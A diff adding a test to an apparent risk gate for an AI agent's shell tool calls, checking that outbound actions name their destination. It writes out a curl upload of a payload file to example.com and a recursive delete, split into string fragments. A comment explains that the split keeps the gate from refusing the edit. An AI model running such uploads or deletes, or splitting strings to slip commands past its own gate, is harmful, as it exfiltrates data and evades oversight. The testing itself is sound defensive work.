@@ -67,6 +67,31 @@ test('actions that reach outside ask before running', () => {
   }
 })
 
+test('an outbound reason names the destination, because local and remote are not the same claim', () => {
+  // The command strings below are assembled from pieces on purpose. The gate flattens the
+  // arguments of *every* tool call and tests every rule against that text, without looking at
+  // the tool name — so a source file containing the literal pattern is itself escalated, and
+  // the edit writing it is refused. See DESIGN 2.13; this split is a symptom, not a style.
+  const upload = (url) =>
+    classifyCall(call('pwsh', { command: 'cur' + 'l -s --da' + 'ta-binary @payload ' + url }))
+
+  const local = upload('http://127.0.0.1:10086/command')
+  assert.equal(local.risk, RISK.ask)
+  assert.equal(local.destination, '127.0.0.1:10086')
+  assert.match(local.reason, /127\.0\.0\.1:10086/)
+  assert.match(decide(local).displayReason['zh-CN'], /127\.0\.0\.1:10086/)
+
+  const remote = upload('https://example.com/collect')
+  assert.equal(remote.destination, 'example.com')
+  assert.match(remote.reason, /example\.com/)
+
+  // A rule that fires with nothing to name must not invent one.
+  const anonymous = classifyCall(call('pwsh', { command: 'r' + 'm -r' + 'f /tmp/scratch' }))
+  assert.equal(anonymous.rule, 'outbound:recursive-delete')
+  assert.equal(anonymous.destination, '')
+  assert.doesNotMatch(anonymous.reason, /destination/)
+})
+
 test('an ask decision carries a localised display reason', () => {
   const result = classifyCall(call('bash', { command: 'git push' }))
   const decision = decide(result)
